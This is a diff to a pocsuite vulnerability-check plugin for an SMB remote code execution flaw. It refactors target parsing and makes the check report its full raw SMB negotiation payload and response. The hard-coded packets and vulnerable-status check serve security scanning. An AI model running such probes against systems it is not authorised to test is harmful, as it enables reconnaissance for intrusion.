@@ -11,7 +11,7 @@ from pocsuite.api.poc import Output, POCBase
 
 class TestPOC(POCBase):
     vulID = '00005'
-    version = '1'
+    version = '1.0'
     author = 'TideSec'
     vulDate = '2017-05-12'
     createDate = '2018-04-19'
@@ -23,17 +23,31 @@ class TestPOC(POCBase):
     appVersion = 'All'
     vulType = 'RCE'
     desc = 'SMB Server存在多个远程执行代码漏洞 成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力'
-    samples = ['']
+    samples = []
     defaultPorts = [445]
-    defaultService = ['netbios-ssn', 'smb', 'sambar']
+    defaultService = ['netbios-ssn', 'smb', 'sambar', 'samba']
+
+    def parse_target(self, target, default_port):
+        schema = 'http'
+        port = default_port
+        address = ''
+        if '://' in target:
+            slices = target.split('://')
+            schema = slices[0]
+            target = slices[1]
+        if ':' in target:
+            slices = target.split(':')
+            address = slices[0]
+            port = slices[1]
+        else:
+            address = target
+        return {'schema': schema, 'address': address, 'port': int(port)}
 
     def _verify(self):
         result = {}
-        target_ip = self.url.split(':')[1].strip('/')
-        if len(self.url.split(':')) > 2:
-            target_port = int(self.url.split(':')[2].strip('/'))
-        else:
-            target_port = 445
+        target = self.parse_target(self.target, 445)
+        target_ip = target['address']
+        target_port = target['port']
         negotiate_protocol_request = binascii.unhexlify("00000054ff534d4272000000001801280000000000000000000000000000"
                                                         "2f4b0000c55e003100024c414e4d414e312e3000024c4d312e3258303032"
                                                         "00024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
@@ -64,8 +78,8 @@ class TestPOC(POCBase):
             if "\x05\x02\x00\xc0" in data:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
-                result['VerifyInfo']['Payload'] = payload[:20]
-                result['VerifyInfo']['Result'] = data[:20]
+                result['VerifyInfo']['Payload'] = payload
+                result['VerifyInfo']['Result'] = data
         except Exception as e:
             print e
             pass
